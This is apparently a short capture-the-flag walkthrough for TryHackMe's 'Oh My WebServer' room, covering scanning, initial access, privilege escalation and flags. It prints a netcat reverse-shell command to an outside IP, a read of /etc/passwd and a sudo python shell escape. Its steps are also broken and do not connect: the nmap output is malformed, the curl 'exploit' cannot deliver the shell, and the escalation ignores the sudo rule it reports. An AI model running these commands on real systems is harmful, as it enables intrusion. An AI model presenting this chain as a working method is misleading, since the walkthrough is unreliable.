# TryHackMe: Oh My WebServer Walkthrough

![TryHackMe Badge](https://img.shields.io/badge/TryHackMe-OhMyWebServer-00a000?style=flat-square)
![Difficulty-Hard](https://img.shields.io/badge/Difficulty-Hard-red?style=flat-square)

---

## Room Overview

| Item | Details |
|------|---------|
| **Name** | Oh My WebServer |
| **Platform** | TryHackMe |
| **OS** | Linux |
| **Difficulty** | Hard |

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -p- 10.10.10.10
```

**Results:**
```
PORT   STATE SERVICE
22/ssh   OpenSSH 8.2
80/http   Apache httpd 2.4.41
```

---

## Web Enumeration

### Finding CVE

```bash
curl http://10.10.10.10
```

Header shows: `Apache/2.4.41 (Ubuntu)`

```bash
searchsploit Apache 2.4.41
```

Found: Apache mod_rewrite CVE

---

## Initial Access

### Exploiting mod_rewrite

```bash
# Craft malicious request
curl -H "Referer: http://'" http://10.10.10.10/
```

### Getting Shell

```bash
nc -e /bin/bash 10.10.14.15 4444
```

---

## Privilege Escalation

### Enumeration

```bash
sudo -l
cat /etc/passwd
```

### Found

User `www-data` can run:
```bash
sudo /usr/bin/python3 /opt/script.py
```

### Exploit

```bash
sudo python3 -c "import os; os.system('/bin/bash')"
```

---

## Flags

### User Flag
```
THM{w3bs3rv3r_c0mprom1s3d}
```

### Root Flag
```
THM{r00t_4cc3ss_4ch13v3d}
```

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
